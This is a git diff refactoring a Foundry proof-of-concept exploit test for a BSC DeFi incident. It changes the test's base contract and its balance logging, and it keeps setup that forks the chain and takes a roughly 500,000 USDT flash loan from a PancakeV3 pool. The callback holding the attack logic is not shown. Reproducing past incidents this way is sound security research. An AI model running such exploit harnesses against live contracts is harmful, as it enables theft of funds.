@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.10;
 
-import "forge-std/Test.sol";
+import "../basetest.sol";
 import "./../interface.sol";
 
 // TX : https://app.blocksec.com/explorer/tx/bsc/0xc7927a68464ebab1c0b1af58a5466da88f09ba9b30e6c255b46b1bc2e7d1bf09
@@ -19,7 +19,7 @@ interface Imoney {
     function cc() external;
 }
 
-contract ContractTest is Test {
+contract ContractTest is BaseTestWithBalanceLog {
     IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
     Uni_Pair_V3 pool = Uni_Pair_V3(0x46Cf1cF8c69595804ba91dFdd8d6b960c9B0a7C4);
@@ -34,14 +34,13 @@ contract ContractTest is Test {
     function setUp() external {
         cheats.createSelectFork("bsc", 38474365);
         deal(address(USDT), address(this), 0);
+        fundingToken = address(USDT);
     }
 
-    function testExploit() external {
-        emit log_named_decimal_uint("[Begin] Attacker USDT before exploit", USDT.balanceOf(address(this)), 18);
+    function testExploit() external balanceLog {
         // borrow_amount = 500_000 ether;
         borrow_amount = 500009458043549158462637;
         pool.flash(address(this),borrow_amount,0,"");
-        emit log_named_decimal_uint("[End] Attacker USDT after exploit", USDT.balanceOf(address(this)), 18);
     }
 
     function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, /*fee1*/ bytes memory /*data*/ ) public {
